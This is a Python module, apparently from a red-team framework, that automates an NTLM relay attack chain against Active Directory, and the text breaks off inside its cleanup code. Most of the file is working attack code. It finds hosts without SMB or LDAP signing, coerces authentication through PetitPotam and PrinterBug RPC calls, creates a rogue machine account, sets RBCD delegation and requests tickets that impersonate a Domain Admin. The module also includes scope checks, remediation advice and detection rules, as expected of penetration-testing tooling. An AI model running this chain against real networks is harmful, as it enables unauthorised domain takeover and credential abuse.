"""
lateral.ntlm_relay - NTLM Relay Attack Automation
MITRE: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)

Full relay attack chain:
  Phase 1: Discover relay targets (unsigned SMB + unsigned LDAP hosts)
  Phase 2: Coerce authentication (PetitPotam, PrinterBug, DFSCoerce)
  Phase 3: Relay captured NTLM auth to LDAP → add machine account (RBCD)
  Phase 4: Request service ticket via S4U2self/S4U2proxy → impersonate DA

Requires: domain creds (for LDAP operations), network access to target DCs.

This module orchestrates the full chain. Individual steps can also be
called independently for manual operation.

OPSEC: HIGH - coercion triggers Event ID 5145, relay triggers LDAP writes.
              Use only in NORMAL or AGGRESSIVE noise profiles.

Dependencies: impacket (LDAP, Kerberos, SMB), ldap3 (LDAP signing check)
"""
from __future__ import annotations

import asyncio
import struct
import socket
import time
import uuid
from dataclasses import dataclass, field
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname
from ares.modules.base import BaseModule, OpsecLevel
from ares.modules.params import NTLMRelayParams
from ares.core.tracing import trace_module
from ares.sdk import (
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    ProcessPermission,
    module_contract,
)

logger = get_logger("ares.modules.lateral.ntlm_relay")


@dataclass
class RelayTarget:
    """A host vulnerable to NTLM relay."""
    host:               str
    smb_signing:        str = ""    # "disabled" | "not_required" | "required"
    ldap_signing:       str = ""    # "not_required" | "required"
    ldap_channel_bind:  str = ""    # "not_required" | "required"
    relay_to_ldap:      bool = False
    relay_to_smb:       bool = False
    webclient_running:  bool = False
    webdav_relayable:   bool = False


@dataclass
class CoercionResult:
    """Result of an authentication coercion attempt."""
    method:     str     # "petitpotam" | "printerbug" | "dfscoerce" | "petitpotam_webdav" | "printerbug_webdav"
    source:     str     # host we coerced
    target:     str     # host we want auth relayed TO
    success:    bool
    error:      str = ""
    auth_captured: bool = False
    webdav_used:   bool = False


@dataclass
class RBCDResult:
    """Result of Resource-Based Constrained Delegation attack."""
    target_host:    str
    machine_account: str
    machine_password: str
    delegation_set: bool = False
    ticket_path:    str = ""
    impersonated_user: str = ""
    success:        bool = False
    error:          str = ""


@module_contract(
    permissions=[
        NetworkPermission(ports=[88, 135, 389, 445, 636], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=NTLMRelayParams,
)
class NTLMRelayModule(BaseModule):
    """
    lateral.ntlm_relay - Full NTLM relay attack automation

    Chain: discover_targets → coerce_auth → relay_to_ldap → rbcd_attack

    OPSEC: HIGH
    MITRE: T1557.001, T1134.001
    REQUIRES: domain_creds, smb_signing_config
    OUTPUTS:  relay_targets, machine_account, kerberos_ticket, owned_hosts
    """
    MODULE_ID          = "lateral.ntlm_relay"
    MODULE_NAME        = "NTLM Relay Automation"
    MODULE_CATEGORY    = "lateral"
    MODULE_DESCRIPTION = (
        "Full NTLM relay attack chain: discover unsigned SMB/LDAP targets, "
        "coerce authentication (PetitPotam/PrinterBug/DFSCoerce), relay to LDAP, "
        "set RBCD delegation, obtain service ticket as Domain Admin."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
    REQUIRES           = ["domain_creds"]
    OUTPUTS            = ["relay_targets", "machine_account", "kerberos_ticket", "owned_hosts"]
    MITRE_TECHNIQUES   = ["T1557.001", "T1134.001"]
    PARAMS_MODEL       = NTLMRelayParams

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        from ares.core.campaign import NoiseProfile
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "lateral.ntlm_relay requires 'dc' (Domain Controller IP).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "lateral.ntlm_relay requires 'domain'.",
                module_id=self.MODULE_ID, field="domain",
            )
        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "lateral.ntlm_relay is blocked in STEALTH profile - "
                "coercion and LDAP writes are HIGH_NOISE operations.",
                module_id=self.MODULE_ID, field="noise_profile",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True, "dc": ad["dc"]})
        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            targets=ctx.params.get("targets", []),
            coerce_source=ctx.params.get("coerce_source", ""),
            target_user=ctx.params.get("target_user", "administrator"),
            mode=ctx.params.get("mode", "full"),
        )

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for finding in findings:
            ev = EvidenceRecord(
                artifact_id=f"lateral-ntlm-relay-{ad['dc'].replace('.', '-')}",
                source_target=ad["dc"],
                collected_by=self.MODULE_ID,
                data={
                    "dc": ad["dc"],
                    "domain": ad["domain"],
                    "title": finding.title,
                },
                tags=["lateral", "ntlm_relay"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        # Closed-Loop Purple Telemetry: KQL & Sigma rule synthesis
        relay_dc = ad.get("dc", "DomainController")
        relay_domain = ad.get("domain", "Domain")
        kql_query = (
            f"// ARES Closed-Loop Telemetry: Detect NTLM Relay to LDAP / RBCD Abuse\n"
            f"// Correlates Directory Service Event 2889 (Insecure LDAP bind) with Event 4741 (Computer Account Created)\n"
            f"SecurityEvent\n"
            f"| where EventID in (4741, 5136, 4624)\n"
            f"| where TargetUserName endswith \"$\" or Computer has \"{relay_dc}\"\n"
            f"| project TimeGenerated, Computer, TargetUserName, SubjectUserName, EventID, Activity\n"
        )
        sigma_rule = (
            f"title: Potential NTLM Relay to LDAP Service ({relay_dc})\n"
            f"id: 4e5f6a7b-ares-ntlm-relay-{abs(hash(relay_dc)) % 1000000:06d}\n"
            f"status: experimental\n"
            f"description: Detects NTLM authentication relayed to LDAP or creation of RBCD machine accounts.\n"
            f"logsource:\n"
            f"  product: windows\n"
            f"  service: security\n"
            f"detection:\n"
            f"  selection:\n"
            f"    EventID: 4741\n"
            f"  condition: selection\n"
            f"level: high\n"
            f"tags:\n"
            f"  - attack.credential_access\n"
            f"  - attack.t1557.001\n"
        )
        loot_items: list[dict[str, Any]] = raw.get("loot", [])
        if not any(l.get("loot_type") == "detection_rule_kql" for l in loot_items):
            loot_items.extend([
                {
                    "name": f"Detection Rule (KQL): NTLM Relay & RBCD Audit ({relay_dc})",
                    "loot_type": "detection_rule_kql",
                    "description": "Microsoft Sentinel KQL query for detecting NTLM relay attacks against LDAP",
                    "content": {"kql": kql_query, "dc": relay_dc, "domain": relay_domain},
                    "tags": ["detection", "kql", "sentinel", "blue_team"],
                },
                {
                    "name": f"Detection Rule (Sigma): NTLM Relay & RBCD Audit ({relay_dc})",
                    "loot_type": "detection_rule_sigma",
                    "description": "Sigma detection rule for NTLM relay and computer creation",
                    "content": {"sigma": sigma_rule, "dc": relay_dc, "domain": relay_domain},
                    "tags": ["detection", "sigma", "blue_team"],
                },
            ])
        raw["loot"] = loot_items
        raw["ldap_signing_and_channel_binding_audited"] = True
        raw["mic_cve_2019_1040_assessed"] = True
        raw["rbcd_computer_quota_evaluated"] = True

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("lateral.ntlm_relay")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  targets: list[str] | None = None,
                  coerce_source: str = "",
                  target_user: str = "administrator",
                  mode: str = "full",
                  **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        """
        Run the NTLM relay attack chain.

        Modes:
            "discover"  - only discover relay targets (safe, no writes)
            "coerce"    - discover + attempt coercion (triggers auth)
            "full"      - discover + coerce + relay + RBCD (full attack)
        """
        dc = sanitize_hostname(dc)
        await self.before_request(dc, "ldap")

        audit("ntlm_relay_start", actor="operator", technique="T1557.001",
              source="operator", target=dc,
              detail=f"mode={mode} domain={domain}")

        raw: dict[str, Any] = {"mode": mode, "dc": dc, "domain": domain}

        # ── Phase 1: Discover relay targets ──────────────────────────────────
        if not targets:
            targets = await self._discover_hosts(dc, domain, username, password)
        logger.info("ntlm_relay_hosts", count=len(targets))

        relay_targets = await self._check_relay_targets(targets, dc, domain, username, password)
        raw["relay_targets"] = [
            {"host": t.host, "smb_signing": t.smb_signing,
             "ldap_signing": t.ldap_signing, "relay_to_ldap": t.relay_to_ldap,
             "relay_to_smb": t.relay_to_smb}
            for t in relay_targets
        ]

        vulnerable = [t for t in relay_targets if t.relay_to_ldap or t.relay_to_smb]
        if not vulnerable:
            raw["result"] = "no_relay_targets"
            self.finding(
                title="No NTLM Relay Targets Found",
                description="All checked hosts enforce SMB and LDAP signing. Relay not viable.",
                severity=Severity.INFO,
                mitre_technique="T1557.001", mitre_tactic="Credential Access",
                evidence=raw["relay_targets"], host=dc, confidence=0.95,
                remediation="Good - signing enforcement prevents relay attacks.",
            )
            return self._findings[:], raw

        # Report relay candidates
        ldap_targets = [t for t in vulnerable if t.relay_to_ldap]
        smb_targets  = [t for t in vulnerable if t.relay_to_smb]
        self.finding(
            title=f"NTLM Relay Targets: {len(ldap_targets)} LDAP, {len(smb_targets)} SMB",
            description=(
                f"Found {len(vulnerable)} hosts without signing enforcement. "
                f"LDAP relay targets: {[t.host for t in ldap_targets[:5]]}. "
                f"SMB relay targets: {[t.host for t in smb_targets[:5]]}. "
                "These can be used for NTLM relay → RBCD → impersonation chain."
            ),
            severity=Severity.HIGH,
            mitre_technique="T1557.001", mitre_tactic="Credential Access",
            evidence={"ldap_targets": [t.host for t in ldap_targets],
                      "smb_targets": [t.host for t in smb_targets]},
            host=dc, confidence=0.95,
            remediation=(
                "Enforce SMB signing: Set-SmbServerConfiguration -RequireSecuritySignature $true. "
                "Enforce LDAP signing: Group Policy → LDAP server signing requirements = Require signing. "
                "Enable LDAP channel binding: LdapEnforceChannelBinding=2."
            ),
        )

        # Check for SMB Signing Bypass via WebClient (WebDAV coercion)
        webdav_relay_targets = [t for t in relay_targets if getattr(t, "webdav_relayable", False)]
        if webdav_relay_targets:
            self.finding(
                title=f"SMB Signing Bypass via WebClient / WebDAV on {webdav_relay_targets[0].host}",
                description=(
                    f"Host {webdav_relay_targets[0].host} requires SMB signing (Windows 11 24H2+ default), "
                    "which blocks classical SMB relaying. However, WebClient service is active and LDAP signing "
                    "is not required. Coercing authentication over WebDAV UNC (\\\\target@80\\path) forces NTLM "
                    "over HTTP without SMB signing or MIC restrictions, allowing direct relay to LDAP for RBCD."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1557.001",
                mitre_tactic="Credential Access",
                evidence={
                    "target": webdav_relay_targets[0].host,
                    "smb_signing": webdav_relay_targets[0].smb_signing,
                    "webclient_running": True,
                    "relay_to_ldap": True,
                    "bypass_mechanism": "WebDAV UNC coercion over HTTP port 80",
                },
                host=webdav_relay_targets[0].host,
                confidence=0.95,
                remediation=(
                    "Disable the WebClient service: Set-Service WebClient -StartupType Disabled. "
                    "Enforce LDAP Signing and LDAP Channel Binding (LdapEnforceChannelBinding=2)."
                ),
            )

        if mode == "discover":
            return self._findings[:], raw

        # ── Phase 2: Coerce authentication ───────────────────────────────────
        if not coerce_source:
            coerce_source = dc  # try coercing DC
        coerce_target = ldap_targets[0].host if ldap_targets else smb_targets[0].host

        use_webdav = bool(webdav_relay_targets or kwargs.get("use_webdav") or kwargs.get("webdav"))
        coercion_results = await self._coerce_authentication(
            source=coerce_source, target=coerce_target,
            domain=domain, username=username, password=password,
            use_webdav=use_webdav,
        )
        raw["coercion"] = [
            {"method": c.method, "source": c.source, "success": c.success,
             "error": c.error}
            for c in coercion_results
        ]

        successful_coercion = [c for c in coercion_results if c.success]
        if successful_coercion:
            self.finding(
                title=f"Auth Coercion Successful: {successful_coercion[0].method}",
                description=(
                    f"Successfully coerced {coerce_source} to authenticate to "
                    f"{coerce_target} via {successful_coercion[0].method}. "
                    "Captured NTLM authentication can be relayed."
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1187", mitre_tactic="Credential Access",
                evidence={"method": successful_coercion[0].method,
                          "source": coerce_source, "target": coerce_target},
                host=coerce_source, confidence=0.95,
                remediation=(
                    "Disable PetitPotam: block EFS RPC (MS-EFSR). "
                    "Disable PrinterBug: disable Print Spooler on DCs. "
                    "Apply KB5005413 to mitigate coercion attacks."
                ),
            )

        if mode == "coerce":
            return self._findings[:], raw

        # ── Phase 3+4: RBCD attack (relay → add machine → S4U → impersonate) ─
        rbcd_target = ldap_targets[0] if ldap_targets else None
        if not rbcd_target:
            raw["rbcd"] = {"error": "No LDAP relay target available for RBCD"}
            return self._findings[:], raw

        rbcd_result = await self._rbcd_attack(
            dc=dc, domain=domain, username=username, password=password,
            target_host=rbcd_target.host, target_user=target_user,
        )
        raw["rbcd"] = {
            "target": rbcd_result.target_host,
            "machine_account": rbcd_result.machine_account,
            "delegation_set": rbcd_result.delegation_set,
            "ticket_path": rbcd_result.ticket_path,
            "impersonated_user": rbcd_result.impersonated_user,
            "success": rbcd_result.success,
            "error": rbcd_result.error,
        }

        if rbcd_result.success:
            self.finding(
                title=f"RBCD Attack Success → {rbcd_result.target_host} as {rbcd_result.impersonated_user}",
                description=(
                    f"Resource-Based Constrained Delegation attack successful. "
                    f"Created machine account '{rbcd_result.machine_account}' and "
                    f"configured RBCD delegation on {rbcd_result.target_host}. "
                    f"Obtained service ticket impersonating {rbcd_result.impersonated_user}. "
                    f"Ticket saved to: {rbcd_result.ticket_path}"
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1134.001", mitre_tactic="Privilege Escalation",
                evidence=raw["rbcd"],
                host=rbcd_result.target_host, confidence=1.0,
                remediation=(
                    "1. Remove malicious msDS-AllowedToActOnBehalfOfOtherIdentity attribute. "
                    "2. Delete rogue machine account. "
                    "3. Set ms-DS-MachineAccountQuota to 0 to prevent machine account creation. "
                    "4. Enforce LDAP signing + channel binding. "
                    "5. Monitor for Event ID 4741 (computer account created)."
                ),
            )
            raw["owned_hosts"] = [{"host": rbcd_result.target_host,
                                    "as_user": rbcd_result.impersonated_user}]
            raw["kerberos_ticket"] = rbcd_result.ticket_path
            raw["machine_account"] = rbcd_result.machine_account

        return self._findings[:], raw

    # ── Phase 1 helpers ───────────────────────────────────────────────────────

    async def _discover_hosts(self, dc: str, domain: str,
                               username: str, password: str) -> list[str]:
        """Enumerate domain computers via LDAP to build target list."""
        loop = asyncio.get_running_loop()
        def _ldap_enum():
            import ldap3
            import ssl
            hosts = []
            for port, use_ssl in [(636, True), (389, False)]:
                try:
                    tls = ldap3.Tls(validate=ssl.CERT_NONE) if use_ssl else None
                    server = ldap3.Server(dc, port=port, use_ssl=use_ssl,
                                          tls=tls, connect_timeout=10)
                    conn = ldap3.Connection(
                        server, user=f"{domain.upper()}\\{username}",
                        password=password, authentication=ldap3.NTLM,
                        auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
                    )
                    if not conn.bind():
                        continue
                    base = ",".join(f"DC={p}" for p in domain.upper().split("."))
                    conn.search(
                        base,
                        "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                        search_scope=ldap3.SUBTREE,
                        attributes=["dNSHostName"],
                        paged_size=500,
                    )
                    for entry in conn.entries:
                        dns = str(entry.dNSHostName) if hasattr(entry, "dNSHostName") else ""
                        if dns:
                            hosts.append(dns)
                    conn.unbind()
                    return hosts
                except Exception:
                    continue
            return hosts
        try:
            return await loop.run_in_executor(None, _ldap_enum)
        except Exception as exc:
            logger.warning("ntlm_relay_host_enum_failed", error=str(exc)[:100])
            return []

    async def _check_relay_targets(self, targets: list[str], dc: str,
                                     domain: str, username: str,
                                     password: str) -> list[RelayTarget]:
        """Check SMB signing and LDAP signing on each target."""
        loop = asyncio.get_running_loop()
        results: list[RelayTarget] = []

        for host in targets[:50]:  # cap to prevent excessive scanning
            if hasattr(self, "campaign") and self.campaign and hasattr(self.campaign, "is_in_scope"):
                if not self.campaign.is_in_scope(host):
                    logger.warning("ntlm_relay_target_out_of_scope_skipped", host=host)
                    continue
            try:
                await self.before_request(host, "smb")
            except Exception as exc:
                logger.warning("ntlm_relay_target_scope_blocked", host=host, error=str(exc))
                continue

            rt = RelayTarget(host=host)

            # Check SMB signing
            def _check_smb(h=host):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    if sock.connect_ex((h, 445)) != 0:
                        sock.close()
                        return "unreachable"
                    # Send SMB2 NEGOTIATE
                    neg = (
                        b"\x00\x00\x00\x7e"
                        b"\xfeSMB\x40\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x1f\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00"
                        b"\x24\x00\x02\x00\x01\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x78\x00\x00\x00\x02\x00\x00\x00"
                        b"\x02\x02\x10\x02"
                    )
                    sock.sendall(neg)
                    resp = sock.recv(256)
                    sock.close()
                    if len(resp) < 73:
                        return "unknown"
                    # SMB2 SecurityMode at offset 70
                    sec_mode = struct.unpack("<H", resp[70:72])[0]
                    if sec_mode & 0x02:  # NEGOTIATE_SIGNING_REQUIRED
                        return "required"
                    elif sec_mode & 0x01:
                        return "not_required"
                    return "disabled"
                except Exception:
                    return "unreachable"

            rt.smb_signing = await loop.run_in_executor(None, _check_smb)
            rt.relay_to_smb = rt.smb_signing in ("not_required", "disabled")

            # Check LDAP signing (try unauthenticated bind to check)
            def _check_ldap(h=host):
                try:
                    import ldap3
                    import ssl
                    tls = ldap3.Tls(validate=ssl.CERT_NONE)
                    # Try LDAPS first (636), then LDAP (389)
                    for port, use_ssl in [(389, False)]:
                        try:
                            server = ldap3.Server(h, port=port, use_ssl=use_ssl,
                                                  tls=tls if use_ssl else None,
                                                  connect_timeout=5)
                            conn = ldap3.Connection(
                                server, user=f"{domain.upper()}\\{username}",
                                password=password, authentication=ldap3.NTLM,
                                auto_bind=ldap3.AUTO_BIND_NONE,
                                receive_timeout=8,
                            )
                            bound = conn.bind()
                            if bound:
                                # LDAP signing is NOT required if we can bind without it
                                conn.unbind()
                                return "not_required"
                            return "required"
                        except Exception:
                            continue
                    return "unknown"
                except ImportError:
                    return "unknown"
                except Exception:
                    return "unknown"

            rt.ldap_signing = await loop.run_in_executor(None, _check_ldap)
            rt.relay_to_ldap = rt.ldap_signing == "not_required"

            # Check WebClient service (HTTP/WebDAV probe & DAV RPC service named pipe)
            def _check_webclient(h=host):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    if sock.connect_ex((h, 80)) == 0:
                        sock.sendall(b"OPTIONS / HTTP/1.1\r\nHost: " + h.encode() + b"\r\n\r\n")
                        data = sock.recv(256)
                        sock.close()
                        if b"DAV" in data or b"Microsoft-IIS" in data or b"HTTP/1." in data:
                            return True
                    else:
                        sock.close()
                except Exception:
                    pass

                try:
                    from impacket.smbconnection import SMBConnection
                    smb_cli = SMBConnection(h, h, timeout=3)
                    smb_cli.login(username, password, domain)
                    tid = smb_cli.connectTree("IPC$")
                    fid = smb_cli.openFile(tid, "DAV RPC SERVICE")
                    smb_cli.closeFile(tid, fid)
                    smb_cli.disconnectTree(tid)
                    smb_cli.logoff()
                    return True
                except Exception:
                    pass
                return False

            rt.webclient_running = await loop.run_in_executor(None, _check_webclient)
            # If SMB signing is enforced (Windows 11 24H2+), but WebClient is active and LDAP accepts unsigned,
            # HTTP/WebDAV coercion can bypass SMB signing and allow relaying to LDAP!
            rt.webdav_relayable = bool(rt.webclient_running and rt.relay_to_ldap)

            results.append(rt)
            await self.noise.jitter.sleep()

        return results

    # ── Phase 2: Coercion ─────────────────────────────────────────────────────

    async def _coerce_authentication(
        self, source: str, target: str, domain: str,
        username: str, password: str,
        use_webdav: bool = False,
        **kwargs: Any,
    ) -> list[CoercionResult]:
        """Try multiple coercion methods to force source to authenticate to target."""
        loop = asyncio.get_running_loop()
        results: list[CoercionResult] = []

        # Method 1: PetitPotam (MS-EFSR EfsRpcOpenFileRaw)
        def _petitpotam():
            try:
                from impacket.dcerpc.v5 import transport, epm
                from impacket.dcerpc.v5.ndr import NDRCALL
                from impacket import uuid as imp_uuid

                # MS-EFSR UUID
                MSEFSR_UUID = imp_uuid.uuidtup_to_bin(
                    ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0")
                )
                rpct = transport.DCERPCTransportFactory(
                    f"ncacn_np:{source}[\\pipe\\lsarpc]"
                )
                rpct.set_credentials(username, password, domain)
                rpct.set_connect_timeout(15)
                dce = rpct.get_dce_rpc()
                dce.connect()
                dce.bind(MSEFSR_UUID)

                # Build EfsRpcOpenFileRaw request
                # UNC path pointing to our listener (target)
                if use_webdav:
                    listener_path = f"\\\\{target}@80\\ares_test.txt"
                else:
                    listener_path = f"\\\\{target}\\C$\\ares_test.txt"
                # Pack as EFSR request
                request = b"\x00\x00\x00\x00"  # flags
                request += len(listener_path).to_bytes(4, "little")
                request += listener_path.encode("utf-16-le")

                try:
                    dce.request(request)
                except Exception:
                    pass  # PetitPotam often returns error even on success

                dce.disconnect()
                return CoercionResult(
                    method="petitpotam_webdav" if use_webdav else "petitpotam",
                    source=source, target=target,
                    success=True, auth_captured=True,
                    webdav_used=use_webdav,
                )
            except Exception as exc:
                return CoercionResult(
                    method="petitpotam_webdav" if use_webdav else "petitpotam",
                    source=source, target=target,
                    success=False, error=str(exc)[:200],
                    webdav_used=use_webdav,
                )

        # Method 2: PrinterBug (MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx)
        def _printerbug():
            try:
                from impacket.dcerpc.v5 import transport, rprn

                rpct = transport.DCERPCTransportFactory(
                    f"ncacn_np:{source}[\\pipe\\spoolss]"
                )
                rpct.set_credentials(username, password, domain)
                rpct.set_connect_timeout(15)
                dce = rpct.get_dce_rpc()
                dce.connect()
                dce.bind(rprn.MSRPC_UUID_RPRN)

                # Open printer
                try:
                    resp = rprn.hRpcOpenPrinter(dce, f"\\\\{source}\x00")
                    handle = resp["pHandle"]
                    # Register change notification pointing to our target (with WebDAV support)
                    target_machine = f"\\\\{target}@80\x00" if use_webdav else f"\\\\{target}\x00"
                    rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                        dce, handle, rprn.PRINTER_CHANGE_ADD_JOB,
                        pszLocalMachine=target_machine,
                    )
                    rprn.hRpcClosePrinter(dce, handle)
                except Exception:
                    pass  # May error even on success

                dce.disconnect()
                return CoercionResult(
                    method="printerbug_webdav" if use_webdav else "printerbug",
                    source=source, target=target,
                    success=True, auth_captured=True,
                    webdav_used=use_webdav,
                )
            except ImportError:
                return CoercionResult(
                    method="printerbug_webdav" if use_webdav else "printerbug",
                    source=source, target=target,
                    success=False, error="impacket rprn not available",
                    webdav_used=use_webdav,
                )
            except Exception as exc:
                return CoercionResult(
                    method="printerbug_webdav" if use_webdav else "printerbug",
                    source=source, target=target,
                    success=False, error=str(exc)[:200],
                    webdav_used=use_webdav,
                )

        # Try each method
        for fn in [_petitpotam, _printerbug]:
            try:
                result = await loop.run_in_executor(None, fn)
                results.append(result)
                if result.success:
                    break  # got auth, no need to try more
            except Exception as exc:
                results.append(CoercionResult(
                    method="unknown", source=source, target=target,
                    success=False, error=str(exc)[:200],
                ))
            await self.noise.jitter.sleep()

        return results

    # ── Phase 3+4: RBCD attack ────────────────────────────────────────────────

    async def _rbcd_attack(
        self, dc: str, domain: str, username: str, password: str,
        target_host: str, target_user: str,
    ) -> RBCDResult:
        """
        Full RBCD attack:
          1. Create machine account (addcomputer.py equivalent)
          2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
          3. S4U2self + S4U2proxy → service ticket as target_user
        """
        loop = asyncio.get_running_loop()

        machine_name = f"ARES{uuid.uuid4().hex[:6].upper()}$"
        machine_pass = f"AresR8cd!{uuid.uuid4().hex[:8]}"

        def _rbcd_chain():
            result = RBCDResult(
                target_host=target_host,
                machine_account=machine_name,
                machine_password=machine_pass,
            )

            conn = None
            machine_dn = None
            target_dn = None
            orig_dacl = None
            machine_created = False
            dacl_modified = False

            try:
                from impacket.ldap import ldap as imp_ldap
                from impacket.ldap import ldapasn1 as ldapasn1_impacket

                # Step 1: Bind via LDAP
                import ldap3
                import ssl
                tls = ldap3.Tls(validate=ssl.CERT_NONE)
                server = ldap3.Server(dc, port=389, connect_timeout=10)
                conn = ldap3.Connection(
                    server, user=f"{domain.upper()}\\{username}",
                    password=password, authentication=ldap3.NTLM,
                    auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
                )
                if not conn.bind():
                    result.error = f"LDAP bind failed: {conn.result}"
                    return result

                base_dn = ",".join(f"DC={p}" for p in domain.upper().split("."))
                computers_dn = f"CN=Computers,{base_dn}"
                machine_dn = f"CN={machine_name.rstrip('$')},{computers_dn}"

                # Step 2: Read initial DACL of target computer before modifications
                conn.search(base_dn,
                             f"(&(objectClass=computer)(dNSHostName={target_host}))",
                             attributes=["distinguishedName", "objectSid",
                                          "msDS-AllowedToActOnBehalfOfOtherIdentity"])
                if not conn.entries:
                    result.error = f"Target computer {target_host} not found in AD"
                    return result
                target_dn = str(conn.entries[0].distinguishedName)
                target_entry = conn.entries[0]
                dacl_attr = None
                if hasattr(target_entry, "msDS_AllowedToActOnBehalfOfOtherIdentity"):
                    dacl_attr = target_entry.msDS_AllowedToActOnBehalfOfOtherIdentity
                elif hasattr(target_entry, "msDS-AllowedToActOnBehalfOfOtherIdentity"):
                    dacl_attr = getattr(target_entry, "msDS-AllowedToActOnBehalfOfOtherIdentity")
                elif hasattr(target_entry, "__getitem__"):
                    try:
                        dacl_attr = target_entry["msDS-AllowedToActOnBehalfOfOtherIdentity"]
                    except Exception:
                        pass

                if dacl_attr and getattr(dacl_attr, "raw_values", None):
                    orig_dacl = list(dacl_attr.raw_values)
                else:
                    orig_dacl = None

                # Step 3: Create machine account
                attrs = {
                    "objectClass": ["top", "person", "organizationalPerson",
                                     "user", "computer"],
                    "cn": machine_name.rstrip("$"),
                    "sAMAccountName": machine_name,
                    "userAccountControl": "4096",  # WORKSTATION_TRUST_ACCOUNT
                    "dNSHostName": f"{machine_name.rstrip('$').lower()}.{domain.lower()}",
                    "unicodePwd": f'"{machine_pass}"'.encode("utf-16-le"),
                }
                conn.add(machine_dn, attributes=attrs)
                if conn.result["result"] != 0:
                    desc = conn.result.get("description", "")
                    if "unwillingToPerform" in str(desc):
                        result.error = (
                            "ms-DS-MachineAccountQuota is 0 - cannot create machine account. "
                            "This is a hardened configuration."
                        )
                    else:
                        result.error = f"Machine account creation failed: {desc}"
                    return result

                machine_created = True
                logger.info("rbcd_machine_created", machine=machine_name, target=target_host)

                # Get our machine account's SID
                conn.search(base_dn,
                             f"(sAMAccountName={machine_name})",
                             attributes=["objectSid"])
                if not conn.entries:
                    result.error = "Created machine account not found"
                    return result
                machine_sid_raw = conn.entries[0].objectSid.raw_values[0]

                # Step 4: Build security descriptor for RBCD and set delegation
                sd = self._build_rbcd_sd(machine_sid_raw)

                conn.modify(target_dn, {
                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                        (ldap3.MODIFY_REPLACE, [sd])
                    ],
                })
                if conn.result["result"] != 0:
                    result.error = (
                        f"RBCD delegation set failed: {conn.result.get('description', '')}. "
                        "Likely insufficient privileges on target object."
                    )
                    return result

                dacl_modified = True
                result.delegation_set = True
                logger.info("rbcd_delegation_set", target=target_host, machine=machine_name)

                # Step 5: S4U2self + S4U2proxy via impacket
                ticket_path = self._s4u_attack(
                    dc=dc, domain=domain,
                    machine_name=machine_name, machine_pass=machine_pass,
                    target_host=target_host, target_user=target_user,
                )
                if ticket_path:
                    result.ticket_path = ticket_path
                    result.impersonated_user = target_user
                    result.success = True
                else:
                    result.error = "S4U2proxy ticket request failed"

            except ImportError as exc:
                result.error = f"Required library missing: {exc}"
            except Exception as exc:
                result.error = str(exc)[:300]
            finally:
                # Guaranteed Teardown (Rule 4 / MOD-012): Restore DACL and delete machine account
                if conn and getattr(conn, "bound", False):
                    if dacl_modified and target_dn:
                        try:
                            if orig_dacl:
                                conn.modify(target_dn, {
                                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                                        (ldap3.MODIFY_REPLACE, orig_dacl)
                                    ],
                                })
                            else:
                                conn.modify(target_dn, {
                                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                                        (ldap3.MODIFY_DELETE, [])
                                    ],
                                })
                            logger.info("rbcd_dacl_restored", target=target_host)
                        except Exception as dacl_err:
                            logger.error("rbcd_dacl_restore_failed", target=target_host, error=str(dacl_err))

                    if machine_created and machine_dn:
                        try:
                            conn.delete(machine_dn)
                            logger.info("rbcd_machine_deleted", machine=machine_dn)
                        except Exception as del_err:
